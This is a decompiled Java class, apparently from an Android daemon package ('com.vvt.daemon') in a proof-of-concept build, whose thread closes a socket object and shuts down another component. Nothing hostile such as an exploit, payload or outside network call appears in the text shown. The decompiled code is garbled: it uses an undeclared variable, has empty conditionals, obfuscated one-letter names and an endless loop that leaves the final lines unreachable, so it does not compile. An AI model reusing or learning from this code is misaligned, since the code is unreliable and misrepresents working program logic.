package com.vvt.daemon;

import com.fx.socket.b;

class d
  extends Thread
{
  d(MainDaemonMain paramMainDaemonMain) {}
  
  public void run()
  {
    Object localObject = this.a;
    bool = MainDaemonMain.a((MainDaemonMain)localObject);
    if (bool) {}
    for (;;)
    {
      try
      {
        localObject = this.a;
        localObject = MainDaemonMain.f((MainDaemonMain)localObject);
        if (localObject != null)
        {
          localObject = this.a;
          bool = MainDaemonMain.a((MainDaemonMain)localObject);
          if (bool) {}
          localObject = this.a;
          localObject = MainDaemonMain.f((MainDaemonMain)localObject);
          ((b)localObject).a();
          localObject = this.a;
          MainDaemonMain.a((MainDaemonMain)localObject, null);
          localObject = this.a;
          bool = MainDaemonMain.a((MainDaemonMain)localObject);
          if (!bool) {}
        }
      }
      catch (Exception localException1)
      {
        MainDaemonMain localMainDaemonMain1 = this.a;
        bool = MainDaemonMain.d(localMainDaemonMain1);
        if (!bool) {
          continue;
        }
        continue;
      }
      try
      {
        localObject = this.a;
        localObject = MainDaemonMain.g((MainDaemonMain)localObject);
        if (localObject != null)
        {
          localObject = this.a;
          bool = MainDaemonMain.a((MainDaemonMain)localObject);
          if (bool) {}
          localObject = this.a;
          localObject = MainDaemonMain.g((MainDaemonMain)localObject);
          ((i)localObject).d();
          localObject = this.a;
          localObject = MainDaemonMain.g((MainDaemonMain)localObject);
          ((i)localObject).l();
          localObject = this.a;
          bool = MainDaemonMain.a((MainDaemonMain)localObject);
          if (!bool) {}
        }
      }
      catch (Exception localException2)
      {
        MainDaemonMain localMainDaemonMain2 = this.a;
        bool = MainDaemonMain.d(localMainDaemonMain2);
        if (!bool) {
          continue;
        }
      }
    }
    localObject = this.a;
    bool = MainDaemonMain.a((MainDaemonMain)localObject);
    if (bool) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/daemon/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */